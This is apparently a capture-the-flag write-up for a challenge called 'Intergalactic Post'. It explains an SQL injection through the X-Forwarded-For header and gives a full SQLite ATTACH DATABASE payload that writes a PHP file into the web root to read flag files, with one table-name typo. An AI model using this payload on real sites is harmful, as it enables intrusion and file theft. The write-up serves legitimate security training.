# Intergalactic Post
## Recon
The website allows you to subscribe to a newsletter. Two values are stored in a sql database; the email address via input field and the 
ip-address extracted from one of the HTTP Header fields `HTTP_X_FORWARDED_FOR`, `REMOTE_ADDR`, `HTTP_CLIENT_IP`.

The flag to capture is located in the www/ folder with name flag_{random_value}.txt

When looking at the source code, we see that the code is vulnerable to sql-injection. 

The insert sql has the format:
`INSERT INTO subscribers (ip_address, email) VALUES('$ip_address', '$email')`

The value of the email address cannot be used for the attack because the email-address
is validated beforehand, but no validation is done for the ip-address.


Therefore we create a malicous http header value for X-FORWARDED-FOR 

## Exploitation
HTTP Header X-FORWARDED-FOR payload:
```
ip','some@email.com'); 
ATTACH DATABASE '/www/static/index.php' AS lol;CREATE TABLE lol.pwn (dataz text); 
INSERT INTO lol6.pwn (dataz) VALUES ("<?php if ($dh = opendir('/')){ while (($file = readdir($dh)) !== false) 
{ if(stripos($file,'flag')>0) { print($file); print(readfile('/'.$file)); } } closedir($dh);} ?> ss ");--
```

1. First, we finish off the actual insert sql with `ip','some@email.com');`
2. Then we create a new database under `/www/static/index.php`
3. In this database we create a new table `lol.pwn` (name doesn't matter)
4. In the new table we store some php code which reads all files in the directory www/ and if the file starts with `flag` we print its content.
5. we discard the initial sql command with `--`

After sending the SQL injection payload, the value of the flag is printed through the "new database" when accessing `/static/index.php`.

## Links
[sql injection payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#remote-command-execution-using-sqlite-command---attach-database)
